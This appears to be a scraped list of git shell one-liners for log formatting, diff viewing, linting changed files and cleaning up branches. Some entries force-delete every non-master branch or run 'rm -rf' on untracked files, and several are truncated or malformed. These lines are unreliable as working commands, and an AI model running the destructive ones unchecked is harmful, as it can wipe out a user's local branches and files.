git log --oneline | head -n 1 | cut -f1 -d' '
git log --oneline | head -20 | tac
git log --oneline | grep Merge | head -n10
git log --oneline | fzf-tmux | awk '{print \$1}'
git log --oneline | fzf --preview 'echo {} | cut -d \
git log --oneline -1 | awk -F '' '{print $1}' | pbcopy
git log --oneline --graph --decorate $(git branch | cut -c 3- | grep nwhyte)
git log --oneline --graph --color --decorate | emojify | less -r
git log --oneline --decorate --graph --color | emojify | less
git log --oneline --color=always | fzf --ansi --preview='git show --color=always {1}' | rg '^(\\S+)' -o
git log --oneline --color | nl -v0 | sed 's/^ \+/&HEAD~/'
git log --oneline --color --decorate --graph --all | emojify | less -r
git log --name-status master...<parse_git_branch()> --committer='Tory Peterschild' | grep -E '^[AMD]\s' | sort -u
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit master..git branch | grep \* | cut -d ' ' -f2
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=relative | emojify | less -r
git log --graph --pretty='tformat:%C(yellow)%h{%C(green)%ar{%C(bold blue)%an{%C(red)%d%C(reset) %s' $* | column -t -s '{' | less -FXRS
git log --graph --oneline --decorate --all --color=always | fzf --ansi +s --preview='git show --color=always {2}' --bind='ctrl-d:preview-page-down' --bind='ctrl-u:preview-page-up' --bind='enter:execute:git show --color=always {2} | less -R' --bind='ctrl-x:execute:git checkout {2} .'
git log --graph --oneline --decorate $(git branch | cut -c 3- | grep nwhyte) master
git log --graph --decorate --pretty=oneline --abbrev-commit -all --color| emojify | less
git log --graph --decorate --pretty=oneline --abbrev-commit --color | emojify | less
git log --graph --decorate --abbrev-commit --all --oneline --color | nowrap | head -$(($(tput lines) - 1))
git log --graph --date=short --pretty='[%C(yellow)%h%Creset] %Cgreen(%ad)%Creset | %C(red)%d%Creset %s | %C(blue)<%an>%Creset'
git log --graph --color --pretty=format:'%C(yellow)%h%Creset %C(bold blue)%an%C(reset) - %s - %Creset %C(yellow)%d%Creset %C(green)(%cr)%Creset' --abbrev-commit --date=relative --all | emojify | less -r
git log --graph --abbrev-commit --decorate --date=relative --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)' `git branch | grep \* | cut -d ' ' -f2`
git log --format=oneline --abbrev-commit | head -n 1 | cut -d ' ' -f1
git log --format=format:'%H %C(dim bold white)%an %Creset%s %C(white dim italic)%cr' \`echo \${git_fzf_format:-'--follow -- .'}\` | fzf -m --ansi --with-nth 2.. --preview 'git diff --color {1}~1 {1}' | awk '{print \$1}'
git log --format='%aN <%aE>' | sort -u | egrep -v '\+ed'
git log --diff-filter=D --summary \$(git rev-list --max-parents=0 HEAD | head -1)..HEAD | egrep -o '*[[:alnum:]]*(/[[:alnum:].]*)+$'
git log --decorate --graph --color --date=relative | emojify | less
git log --date=short --pretty='[%C(yellow)%h%Creset] %Cgreen(%ad)%Creset | %C(red)%d%Creset %s | %C(blue)<%an>%Creset'
git log --date=local --pretty='%C(white)%h%C(yellow)%d %Cred%>|(30)%an%Creset: %s %<|(90)%C(yellow)(%cd)' --author
git log --date=local --pretty='%C(white)%h%C(yellow)%d %Cred%>|(30)%an%Creset: %s %<|(90)%C(yellow)(%cd)'
git log --color=never | head -2000 | vim -
git log --color=always --pretty=format:'GPGSIG%G?%C(red)%h%C(reset) -%C(auto)%d%C(reset) %s %C(green)(%cr) %C(bold blue)<%an>%C(reset)' | sed -e 's/GPGSIGN\(...\)./\11/; s/GPGSIGG\(...\)./\12/; s/GPGSIG.\(...\)./\13/;' | less -RX
git log --color=always --pretty=format:'%C(yellow)%h %Cred%ad %Cblue%an %Creset%s' --date=short | fzf --tiebreak=index --ansi | cut -d ' ' -f 1
git log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen | %ad (%cr) | %C(bold blue)<%an>%Creset' --abbrev-commit --date=short
git log --all --graph --color=always --pretty=format:'GPGSIG%G?%C(red)%h%C(reset) -%C(auto)%d%C(reset) %s %C(green)(%cr) %C(bold blue)<%an>%C(reset)' | sed -e 's/GPGSIGN\(...\)./\11/; s/GPGSIGG\(...\)./\12/; s/GPGSIG.\(...\)./\13/;' | less -RX
git log --all --author=keithsalisbury | grep Date | awk \
git log --all --author='Julian Tiemann' --reverse --format=%B --maxcount=80 | sed '/^$/d' | sed 's/^/* /'
git log --abbrev-commit --pretty=oneline | head -n 1 | cut -d \ -f 1
git log --abbrev-commit --pretty=oneline | head -2 | pbcopy
git log $(git tag | peco)...$(git tag | peco) --oneline
git log $(git tag --list | sort -V | tail -n 1)..master
git list-branch-diffed-files | egrep --color=never '_(spec|test).rb'
git lgc remotes/origin/$(git branch | grep \* | cut -d ' ' -f2)..HEAD
git lg | tac | sed -e 's/\\\\/\\!SLASH\\!/g' -e 's/\\//\\\\/g' -e 's/\\!SLASH\\!/\\//g'
git ld | sort -r | more -R
git latest | sed '1!G;h;\$!d' | head -5
git l | head -n1 | cut -f 2 -d ' '
git hamster || git co ghammond
git grep -l TODO | xargs -n1 git blame -f | grep TODO
git grep --cached -l '' | tr '\n' '\0' | xargs -0 grep --color -n
git fsck --no-reflogs | grep 'dangling commit' | awk '{print $3;}'
git for-each-ref refs/heads --format='%(refname:short)' | fzy | xargs git checkout
git for-each-ref --sort=taggerdate --format '%(refname) %(taggerdate)' refs/tags | sed 's/refs\/tags\///' | egrep --color=always '^[-_.[:alnum:]]+ '
git for-each-ref --sort=committerdate --format='%(committerdate:short) %(refname)' refs/heads | sed 's/refs\/heads\///' | tail -20
git for-each-ref --sort=-committerdate refs/heads/ | head -10 | sed 's/refs\/heads\///g'
git for-each-ref --sort=-committerdate refs/heads/ --format='%(refname) %(committerdate) %(authorname)' | sed 's/refs\/heads\///g' | head -n
git for-each-ref --sort=-committerdate --count=10 --format='%(refname:short)' refs/heads/ | fzf | xargs -I branch git checkout branch && npm run dev
git for-each-ref --sort='-authordate' --format='%(refname) $%(authordate:relative) $%(authorname) $%(objectname:short)' refs/heads refs/remotes | sed -e 's-refs/heads/--' | column -t -s$
git for-each-ref --format='%(refname:short)' refs/heads | fzf | xargs git checkout
git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)' | sort -k5n -k2M -k3n -k4n | grep \
git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)' | sort -k5n -k2M -k3n -k4n | grep '/remotes/'
git for-each-ref --format='%(authorname) %09 %(refname)' --sort=authorname | awk '/Jon.+refs\/heads/{print \$NF}' | cut -b 12-
git for-each-ref --format '%(refname:short)' refs/heads | grep -v master | xargs git branch -D
git for-each-ref --format '%(refname:short)' --merged master refs/heads|grep -v master|xargs git branch -d
git for-each-ref --count=30 --sort=-committerdate refs/heads/ --format='Branch: %(refname:short) | Author: %(authoremail) | Date: %(authordate:short)'
git for-each-ref --count=20 --sort=-committerdate refs/heads/ --format='Branch: %(refname:short) | Author: %(authoremail) | Date: %(authordate:short)'
git files-changes | grep spec | xargs bundle exec rspec --format=documentation
git fetch;git merge origin/$(git -b --no-color | grep \* | cut -d\ -f 2)
git fetch; git branch --merged | grep -v master | xargs -n 1 git branch -d
git fetch | git checkout master | git pull origin master
git fetch origin --prune && git branch --merged | grep -v master | xargs git branch -d
git fetch -p && git branch -vv| sed '/: gone] /!d;s/^[ ]*\([^ ]*\) .*$/\1/' | xargs git branch -D
git fetch -p && git branch -vv | awk '/: gone]/{print \$1}' | xargs git branch -d
git fetch -p && git branch -vv | awk '/: gone]/{print \$1}' | xargs git branch -D
git fetch -p && git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -d && git pull
git fetch -p && git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -d
git fetch -p && git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -D
git fetch -p && git branch -r | grep richard | cut -d\/ -f2-
git fetch -p && for branch in `git branch -vv | grep ': gone]' | awk '{print $1}'`; do git branch -D $branch; done;
git fetch -p && for branch in `git branch -vv | grep ': gone]' | awk '{print $1}'`; do git branch -D $branch; done
git fetch -p && for branch in \`git branch -vv | grep ': gone]' | awk '{print \$1}'\`; do git branch -d \$branch; done
git fetch -p && for branch in \$(git branch -vv | grep ': gone]' | gawk '{print \$1}'); do git branch -D \$branch; echo 'deleted \$branch'; done
git fetch -p && for branch in \$(git branch -vv | grep ': gone]' | awk '{print \$1}'); do git branch -D \$branch; done
git fetch --verbose --progress --all --prune -j$(nproc 2>/dev/null || echo 1)
git fetch --prune && git branch --merged master --no-color | grep -v '^[ *]*master$' | xargs git branch -d
git fetch --all -p;git branch -vv | grep -E '[0-9|a-f]{7} \[origin/.*?: gone\]'
git fetch --all --prune -q && git branch -vv | cut -c 3- | awk '
git fetch && git rebase origin/master || sadface
git fetch && git rebase origin/develop || sadface
git fetch && git rebase origin/`echo $(git symbolic-ref --short -q HEAD)` || sadface
git fetch && git merge master origin/master && git branch --merged master | grep -v master | xargs git branch -d
git fetch && git log origin/master..origin/chp-working | grep 'pull request' && git log origin/master..origin/chp-working | grep 1337
git fetch && git branch --merged | grep -v master | xargs git branch -d && git remote prune origin
git diff-index --quiet HEAD || git commit -m NoMessage
git diff-index --quiet HEAD || git commit
git diff-index --quiet HEAD -- || clear; git --no-pager diff --patch-with-stat
git diff-index --quiet HEAD -- || clear \${comment:'show diff files'}
git diff-index --name-only master | grep '\.rb$' | xargs bundle exec rubocop
git diff-index --name-only master | grep '.*\.js' | xargs $(npm bin)/eslint
git diff-files --quiet && git diff-index --cached --quiet HEAD -- || unclean='*'
git diff | ucat | le
git diff | tee /dev/tty | pbcopy
git diff | nkf -w | colordiff
git diff | grep HEAD | wc -l
git diff | grep -v '^\-' | grep --after-context=2 -e TODO -e XXX -e '^diff '
git diff | diff_painter.pl | less
git diff | cut -c -300 | view -
git diff | colordiff | less -r
git diff | colordiff | less -R
git diff | /Users/itarato/Applications/colordiff.pl | less -R
git diff upstream/master --name-only --pretty=format: --diff-filter=AM | grep '.php$' | xargs ./vendor/bin/phpcs --standard=./vendor/behance/php-sniffs/Behance/
git diff upstream/master --name-only --pretty=format: --diff-filter=AM | grep '.php$' | xargs ./vendor/bin/phpcbf --standard=./vendor/behance/php-sniffs/Behance/ruleset.xml
git diff origin/master --name-only | grep .js$ | xargs prettier --write
git diff master --name-only | grep _spec | xargs rspec
git diff master --name-only | egrep '.py$' | xargs env/bin/pep8 --max-line-length=99
git diff master --name-only | egrep '.py$' | xargs bin/pep8
git diff dev $(git branch | grep \* | cut -d ' ' -f2) >> diffWithDev.diff
git diff `git tag --sort version:refname | tail -n 2 | head -n 1` HEAD
git diff `git merge-base master HEAD` --full-index | post-review --diff-filename=- --open --branch=`git rev-parse --abbrev-ref HEAD` --bugs-closed=`git rev-parse --abbrev-ref HEAD | cut -d/ -f1` --summary=`git rev-parse --abbrev-ref HEAD`
git diff \`git status -s |grep -v 'dist/' |cut -b4-\`
git diff \`git log | head -n 1 | awk -F ' ' '{print \$2}'\` --stat
git diff \`git log | head -n 1 | awk -F ' ' '{print \$2}'\`
git diff \$(git branch | grep \* | cut -d ' ' -f2)
git diff HEAD~1 --name-only | grep '\.py$' | xargs pep8 -r
git diff HEAD | colordiff | less -R
git diff HEAD --name-only | grep php$ | xargs -n1 -P8 php -l -n
git diff ...origin | git fetch | sublime -w
git diff -z --name-only origin/master..HEAD | xargs -0 bundle exec rubocop-select | xargs rubocop
git diff -w -G'(^[^\*# ])|(^#\w)|(^\s+[^\*#])'
git diff -w --color | diff-so-fancy | less -R
git diff -p --color | diff-highlight | less
git diff -U10 | dwdiff --diff-input -c | less -R
git diff --no-ext-diff -b -w -z --color=never | ~/conf/script/git_diff.php | less
git diff --no-ext-diff --color | diff-so-fancy | less
git diff --name-status --diff-filter=U | sort | cut -f2
git diff --name-status --diff-filter=U | cut -f 2 | parallel -Xj1 --tty vim
git diff --name-only|grep '.*\.lua'|xargs luacheck
git diff --name-only | uniq | xargs vim -p
git diff --name-only | uniq | xargs vim -
git diff --name-only | uniq | xargs vim
git diff --name-only | uniq | xargs vi
git diff --name-only | uniq | xargs sublime
git diff --name-only | uniq | xargs subl
git diff --name-only | uniq | xargs nvim
git diff --name-only | uniq | xargs mvim
git diff --name-only | uniq | xargs mate
git diff --name-only | uniq | xargs code-insiders
git diff --name-only | uniq | xargs code
git diff --name-only | uniq | xargs atom
git diff --name-only | uniq | xargs $EDITOR
git diff --name-only | rg kt | xargs ktlint -F
git diff --name-only | peco | xargs git checkout
git diff --name-only | grep spec | xargs rspec
git diff --name-only | grep -G '.*\.rb' | xargs rubocop
git diff --name-only | grep '\.js$'|xargs jshint
git diff --name-only | grep '.rb' | xargs rubocop
git diff --name-only | grep '.rb' | xargs rspec
git diff --name-only | grep '.py$' | xargs flake8
git diff --name-only origin/master | grep -E \\.jsx?$ | xargs -t -n1 prettier --write --tab-width 4 --single-quote --trailing-comma all --no-semi
git diff --name-only origin/master | grep '\.png$' | xargs -I xxx -P 10 -t pngbai xxx xxx2
git diff --name-only master... | grep test | xargs rails test
git diff --name-only master..$(__git_ps1 %s) | grep \\.rb | xargs rubocop
git diff --name-only master | grep _spec.rb | xargs bundle exec rspec
git diff --name-only master | grep -v test | xargs git diff master --
git diff --name-only master | grep *spec* | xargs zeus rspec
git diff --name-only master | grep *spec* | xargs rspec
git diff --name-only HEAD\^ | grep '.py$' | xargs flake8
git diff --name-only HEAD | peco --initial-filter=Fuzzy | xargs git diff HEAD --
git diff --name-only HEAD origin/master | grep -e 'spec.*\.rb' | xargs rspec
git diff --name-only --diff-filter=U | uniq | xargs open
git diff --name-only --diff-filter=U | uniq | xargs code
git diff --name-only --diff-filter=U | uniq | xargs $EDITOR
git diff --name-only --diff-filter=AMR origin/master | grep _spec.rb | xargs rspec
git diff --name-only --diff-filter=AM | grep '\.rb$' | xargs rubocop -a
git diff --name-only --diff-filter=AM | grep '\.rb$' | xargs rubocop
git diff --name-only --diff-filter=AM | grep '.rb$' | xargs bundle exec rubocop -RDa
git diff --name-only --cached | grep '\.rb' | xargs rubocop -a
git diff --name-only --cached | grep '\.rb' | xargs bundle exec rubocop -a
git diff --name-only *.profile | cut -d/ -f3 | sed -e 's/^/\
git diff --ignore-space-change --staged --color $@ | diff-so-fancy | less --tabs=2 --RAW-CONTROL-CHARS --quit-if-one-screen --no-init --chop-long-lines
git diff --ignore-space-change --color $@ | diff-so-fancy | less --tabs=2 --RAW-CONTROL-CHARS --quit-if-one-screen --no-init --chop-long-lines
git diff --diff-filter=ACMR --name-only origin/master | grep .php | xargs -L1 php -l
git diff --diff-filter=ACM --name-only | grep _spec | xargs bundle exec rspec
git diff --color-words='[^[:space:]]|([[:alnum:]]|UTF_8_GUARD)+'
git diff --color-words='[[:space:]]|([[:alnum:]]|UTF_8_GUARD)+' --word-diff=plain
git diff --color-words --word-diff-regex='[^[:space:]]|([[:alnum:]]|UTF_8_GUARD)+'
git diff --color | sed 's/^\([^-+ ]*\)[-+ ]/\\1/' | less -r
git diff --color | redmine_format | less -R
git diff --color | iconv -f cp1251 -t utf8 | less -r
git diff --color | diff-so-fancy | less -SRi
git diff --color | diff-so-fancy | less -R
git diff --color | diff-so-fancy | less --tabs=4 -RFX
git diff --color | diff-so-fancy | less --tabs=2 -RFX
git diff --color | diff-so-fancy | less
git diff --color | diff-so-fancy | bat
git diff --color | diff-highlight | strip_diff_leading_symbols
git diff --color | diff-highlight | diff-so-fancy
git diff --color -M | cat -A | lessr
git diff --color -M --staged | cat -A | lessr
git diff --color --cached | diff-so-fancy | less --tabs=4 -RFX
git diff --cached | colordiff | less -r
git diff --cached -w --color | diff-so-fancy | less -R
git diff --cached --numstat | wc -l | sed -e \
git diff --cached --name-only | grep '.rb' | xargs rubocop
git diff --cached --name-only | grep '.rb' | xargs rspec
git diff --cached --name-only | fzf -m | xargs -r git rest HEAD; git status
git diff --cached --name-only --diff-filter=AM|grep '\.php'|xargs phpcs -pns --standard=BEAR --encoding=utf-8 $1
git diff --cached --color | diff-so-fancy | less -R
git diff $(git log | head -n1 | awk '{ print $2 }')^!
git describe | trim | xsel -b
git cz || git commit -m
git credential-corpsso check > /dev/null || glogin; repo sync -qcj${MP_J:-$(($(envproc) err.txt generated.file succ.txt 2))}
git credential-corpsso check > /dev/null || glogin; repo sync -cj99 .
git config remote.origin.url | sed -en 's/git@github\.com\:([^\/]*)\/(.*)\.git/https\:\/\/github.com\/\1\/\2\/pulls/p' | xargs open
git config remote.origin.url | sed -en 's/git@github\.com\:([^\/]*)\/(.*)\.git/https\:\/\/github.com\/\1\/\2/p' | xargs open
git config branch.\$(git branch | sed '/^\\*/ !d; s/^\\* //').remote up && git config branch.\$(git branch | sed '/^\\*/ !d; s/^\\* //').pushremote origin
git config -l | grep alias | cut -c 7-
git config --list | grep alias | grep
git config --get remote.origin.url | sed 's/\.git//' | xargs open
git commit -v -m $(git diff --name-only --cached | xargs | sed -e s/\\s/----/g)
git commit -am oki || git push
git commit -a; git log -n 1 --pretty=%H | tr -d \n | pbcopy;
git commit --squash \`glo | fzf | cut -d ' ' -f 1\`
git commit --fixup \`glo | fzf | cut -d ' ' -f 1\`
git co master && git pr && git branch --merged | grep -v 'master' | xargs -n 1 git branch -D
git co master && git branch | grep -v \* | xargs git branch -D && git remote prune origin
git co master && git branch --merged | grep -v \* | xargs git branch -D && git remote prune origin
git clone `git remote -v show |cut -f 2 |cut -f 1 -d ' '`
git clean -ndx | awk '! /iml/ && ! /\.idea/ {print $3}' | xargs rm -rf
git clean -fd && find . -name '*.pyc' | xargs rm && find . -name '__pycache__' | xargs rm -rf
git cherry-pick \`git reflog | fzf | cut -d ' ' -f 1\`
git checkout xmpush-ahei 2>/dev/null || git checkout ahei
git checkout staging 2>/dev/null ||
git checkout origin/master -f | git checkout master -f | git pull origin master
git checkout master; git remote prune origin; git branch | sed -Ee 's/^\*? *//g' -Ee '/^master$/d' | xargs git branch -D;
git checkout master; git pull origin master; git fetch --all -p; git branch -vv | awk '$3 $4 ~ /:gone]$/ { print $1 }' | xargs -n 1 git branch -d
git checkout master; git pull origin master; git branch | grep -v master | xargs git branch -d; git remote prune origin
git checkout master; git branch -d \$(git branch --merged | grep -v master | grep -v '*')
git checkout master | git fetch --all | git pull
git checkout master | git branch -r --merged | grep -v master
git checkout master 2>/dev/null || git checkout default
git checkout master && git pull && git branch --merged | grep -v \* | xargs git branch -d
git checkout master && git pull && git branch --merged master | grep -v '\* master' | xargs -n 1 git branch -d
git checkout master && git fetch -p --all && (git merge --ff-only upstream/master || git pull)
git checkout master && git fetch -p && git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -d
git checkout master && git fetch -p && git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -D
git checkout master && git branch | grep -v master | xargs git branch -D
git checkout master && git branch --merged | grep -v master$ | xargs git branch -d
git checkout master && git branch --merged | grep -v master | xargs git branch -d
git checkout master && git branch --merged | grep -v master | xargs -I % git branch -d %
git checkout master && git branch --merged | grep -v \\* | xargs git branch -d
git checkout master && git branch --merged | grep -v \* | xargs git branch -D
git checkout master && git branch --merged | grep -v '\\*' | xargs -n 1 git branch -d
git checkout master && git branch --merged | grep -v '* master' | xargs -n 1 git branch --delete
git checkout master && git branch --merged master | grep -v '^\*' | xargs -n 1 git branch -d
git checkout master && git branch --list | grep -v \* | xargs git branch -D
git checkout letsdothis || git checkout -b letsdothis
git checkout develop || git pull
git checkout develop && git branch --merged | grep -v '*' | xargs -I % git branch -d % && git fetch --prune
git checkout `git branch --all | grep -v HEAD | fzf`
git checkout \`git tag | ${gnu_prefix}sort -V | tail -1\`
git checkout \`git branch | peco | sed -e \
git checkout \$(git branch | sed 's/*/ /' | fzf)
git checkout \$(git branch | cut -c 3- | pick)
git checkout \$(git branch -vv | fzf +m | awk '{print \$1}')
git checkout \$(gbt | awk -rF' +=> +' '/=>/{print \$2}' | tail -1)
git checkout -b fire/$USER/$RANDOM ; git commit -m'staged' --allow-empty ; git commit -am'working' --allow-empty ; git add . ; git commit -am'untracked' --allow-empty ; git push -u origin `git branch --no-color | grep \* | cut -d ' ' -f2`
git checkout --quiet master && git branch --merged | grep -v master | xargs -n 1 git branch -d && git checkout --quiet @{-1}
git checkout --quiet master && git branch --merged | grep --invert-match '\\*' | xargs -n 1 git branch --delete; git checkout --quiet @{-1};
git checkout --$(test -f .git/MERGE_HEAD && echo theirs || echo ours) --
git checkout --$(test -f .git/MERGE_HEAD && echo ours || echo theirs) --
git checkout -- npm-shrinkwrap.json || true && rm -rf node_modules/ && nvm use && npm install
git checkout -- `${GITMOD} | ${AWKCMD} ${AWKFILE} | xargs`
git checkout $(git branch | percol | grep -Eo
git checkout $(git branch | peco | tr -d \*)
git checkout $(git branch | grep -v $(git rev-parse --abbrev-ref HEAD) | fzf)
git checkout $(git branch | cut -c 3- | pick)
git checkout $(git branch | cut -c 3- | fzy)
git checkout $(git branch | ag -v ^\\* | fzf)
git checkout $(git branch -a | peco | sed -e
git checkout $(git branch -a | cut -c 3- | sed
git checkout $(git branch --list | pick | cut -d \w -f 1) ; git checkout $branch
git checkout $(git branch --list | fzf | cut -c 3-)
git checkout $(git branch --list -a | cut -c 3- | fzf)
git check-ignore err.txt generated.file succ.txt | tr '\\n' ' ' | xargs rm -rf
git branch|grep -v master|xargs git branch -D
git branch|awk '/^\*/ { print \$2 }'|xargs git push origin
git branch|awk '/^\*/ { print \$2 }'|xargs git pull origin
git branch; git rev-parse --abbrev-ref HEAD | tr -d '\n' | pbcopy; echo Copied current branch to clipboard.
git branch |grep '^*' |cut -d' ' -f2
git branch | xargs -n1 ~/bin/branch-date | sort
git branch | sed -n '/\* /s///p' | xclip -sel clip
git branch | pick | xargs git checkout
git branch | percol | xargs git checkout
git branch | peco | xargs git switch
git branch | peco | xargs git rebase
git branch | peco | xargs git merge --ff
git branch | peco | xargs git merge
git branch | peco | xargs git checkout
git branch | peco | xargs git branch -d
git branch | peco | xargs git branch -D
git branch | peco | pbcopy
git branch | grep arcpatch | xargs git branch -D {}
git branch | grep ^\\* | sed -e 's/^* //'
git branch | grep ^\* | sed 's/* //'
git branch | grep ^\* | cut -d' ' -f2-
git branch | grep ^\* | cut -c 3-
git branch | grep ^\* | awk '{print \$2}'
git branch | grep ^* | cut -f2 -d\
git branch | grep ^* | cut -c 3-
git branch | grep \\* | cut -d ' ' -f2
git branch | grep \* | tr -d '* '
git branch | grep \* | sed s/*\ //g
git branch | grep \* | sed 's/\*\ //'
git branch | grep \* | cut -d ' ' -f2
git branch | grep \* | cut -d ' ' -f 2
git branch | grep \* | cut -d
git branch | grep \* | awk {'print $2'}
git branch | grep \* | awk
git branch | grep -ve '*' -e master | xargs git branch -D
git branch | grep -v master | xargs git branch -d
git branch | grep -v master | xargs git branch -D
git branch | grep -v develop | xargs git branch -d
git branch | grep -v \* | xargs git branch -D
git branch | grep -v \* | xargs -I {} git branch -d {} ; git branch
git branch | grep -v \* | xargs -I {} git branch -d {} ; gb
git branch | grep -v \* | xargs -I {} git branch -D {} ; git branch
git branch | grep -v \* | xargs -I {} git branch -D {} ; gb
git branch | grep -v \* | tr -d ' '
git branch | grep -v -e master -e dev |xargs git branch -D
git branch | grep -v -e develop -e master | xargs git branch -d 2>/dev/null
git branch | grep -v 'master' | xargs git branch -D
git branch | grep -v 'develop' | xargs git branch -D
git branch | grep -v '^*' | xargs git branch -d
git branch | grep -v '^*' | xargs git branch -D
git branch | grep -v '*' | xargs git branch -D
git branch | grep -e '^*' | cut -d' ' -f2
git branch | grep -E '^\*' | awk '{print $2}'
git branch | grep -E '^\* ' | sed 's/^\* //g'
git branch | grep --invert master | xargs git branch -d
git branch | grep '^\*' | sed 's/* //'
git branch | grep '^\* ' | cut -d ' ' -f 2
git branch | grep '*' | sed 's;*;;g'
git branch | grep '*' | cut -f2 -d ' '
git branch | grep '*' | cut -c 3-
git branch | grep '*' | awk '{print \$2}'
git branch | fzf-tmux -d 15 | xargs git checkout
git branch | fzf | xargs tig --stdin
git branch | fzf | xargs git co
git branch | fzf | xargs git checkout
git branch | fzf | xargs git branch -d
git branch | fzf | xargs git branch -D
git branch | fzf | xargs -n1 git checkout
git branch | fzf | xargs -I {} git checkout {}
git branch | fzf | xargs -I {} git branch -D {}
git branch | fzf --multi | xargs git branch -d
git branch | fzf --multi | xargs git branch -D
git branch | fzf --height 33% --reverse --border | xargs git checkout
git branch | fzf --height 20% | xargs git checkout
git branch | egrep '\* ' | cut -c 3- -
git branch | cut -c 3- | pick
git branch | cut -c 3- | fzf
git branch | awk '{ if (NF == 2) print $2 }' | xargs -I % git log --oneline --first-parent %
git branch | awk '/^\* (.+)/ { print $1 }' | sed 's/\* //'
git branch | ack '\*' | awk '{print \$2}'
git branch 2>/dev/null | grep \* | sed 's/* //'
git branch 2>/dev/null | grep '^*' | colrm 1 2
git branch 2>/dev/null | grep '*' | sed 's/\* //'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/\[ \1 \]/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/\1/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/\(\1\)/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/[git:\1]/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/(\1)/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/ [\1]/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/ (\1)/'
git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/ (\1) /'
git branch 2>/dev/null | grep '*' | sed 's/ \(.*\)/(\1)/'
git branch 2> /dev/null | grep '*' | sed 's/* \(.*\)/\1/' 2> /dev/null
git branch 2> /dev/null | grep '*' | cut -d ' ' -f 2
git branch -vv | grep -i '\[.* gone\]' | awk '{ print \$1 }'
git branch -vv | grep 'origin/.*: gone]' | awk '{print \$1}'
git branch -vv | grep 'origin/.*: gone]' | awk '{print $1}'
git branch -vv | grep '\* ' | sed 's/.*\[\(.*\)\].*/\1/g; s/.*(HEAD detached at \(.*\)).*/\1/g; s/\* \(.*\) .*/\1/g; s/\*\ \([^ ]*\)\ .*/\1/g'
git branch -vv | grep ': gone]'| grep -v \
git branch -vv | grep ': gone]'| grep -v
git branch -vv | grep ': gone]' | grep -v \
git branch -vv | grep ': gone]' | awk '{print $1}'
git branch -vv | cut -c 3- | awk '{print
git branch -vv | cut -c 3- | awk '$3 !~/\\[/ { print $1 }'
git branch -vv | cut -c 3- | awk '
git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -d
git branch -vv | awk '/: gone]/{print $1}' | xargs --no-run-if-empty git branch -D
git branch -vv | ag gone | awk
git branch -r | sed 's/origin\///' | grep
git branch -r | grep -v '\->' | while read remote; do git branch --track \
git branch -r | grep -v '\->' | while read remote; do git branch --track
git branch -r --no-merged | xargs -n 1 git --no-pager show -s --format='%d %an <%ae>' | grep 'Frank Moda'
git branch -r --merged | grep -v master | sed
git branch -r --merged | grep -v HEAD | xargs -n 1 git --no-pager show -s --format='%d %an <%ae>'
git branch -la | fzf | xargs git checkout
git branch -l | fzf | xargs git switch
git branch -l | fzf | xargs git checkout
git branch -l | fzf | xargs git branch -d
git branch -l --merged | grep -v master | xargs -n 1 git branch -d
git branch -d `git branch --merged | grep -v '^*' | tr -d '\n'`
git branch -d $(git branch | grep -v master | grep -v api)
git branch -d $(git branch --merged | grep -v master | grep -v '^\*')
git branch -d $(git branch --merged | grep -v master | grep -v '*')
git branch -d $( git branch --merged | grep -v '^\*' | grep -v 'master' )
git branch -a| fzf --height 33% --reverse --border | xargs git checkout
git branch -a |percol|xargs git chechout
git branch -a |grep v10 |grep
git branch -a | tr -d \* | xargs git grep
git branch -a | peco | sed -e
git branch -a | ipt | xargs git checkout
git branch -a | grep -v remotes | grep
git branch -a | grep -v -e '*' -e 'HEAD' | awk '{ print \$1 }'
git branch -a | fzf | xargs git diff
git branch -a | fzf | xargs git checkout
git branch -a | fzf | xargs -I% git merge % $(git_branch)
git branch -a | cut -b 3- | perl -pe
git branch -a --sort=-authordate | cut -b 3- | perl -pe
git branch -D `git branch -vv | grep -v origin | awk '{print $1}'`
git branch -D `git branch --merged | grep -v \* | xargs`
git branch -D \$(git branch | grep -v \* | xargs)
git branch --track `git branch | grep \* | cut -d
git branch --sort=creatordate --format='%(authordate:short) %(color:red)%(objectname:short) %(color:cyan)%(committername)%(color:reset) %(color:yellow)%(refname:short)%(color:reset) (%(color:green)%(committerdate:relative)%(color:reset))' | grep -v ';HEAD$' | column -s ';' -t
git branch --sort=-committerdate | tail -r | tail -10
git branch --sort=-committerdate | head -n 1 | pbcopy
git branch --sort=-authordate | cut -b 3- | perl -pe
git branch --show-current | tr -d '[:space:]' | clip
git branch --remote| fzf --height 33% --reverse --border | xargs git checkout -t
git branch --no-merged | ag -v hk | xargs git branch -D
git branch --no-color --merged | grep -v '^*' | xargs git branch -d
git branch --no-color --merged master | grep -v master | xargs git branch -d
git branch --move \`git branch | grep \* | sed 's/\*//'\`
git branch --merged | ~/Development/marcbachmann/trim | xargs -n 1 git branch -d
git branch --merged | grep -vP '^\* ' | xargs git branch -d
git branch --merged | grep -v master | xargs git branch -d
git branch --merged | grep -v master | xargs echo git branch -d
git branch --merged | grep -v master | xargs -n 1 git branch -d
git branch --merged | grep -v master | xargs -I % git branch -d %
git branch --merged | grep -v master | grep -v
git branch --merged | grep -v integration | xargs -n 1 git branch -d
git branch --merged | grep -v \\* | xargs -I % git branch -d %
git branch --merged | grep -v \* | xargs git branch -d
git branch --merged | grep -v \* | xargs git branch -D
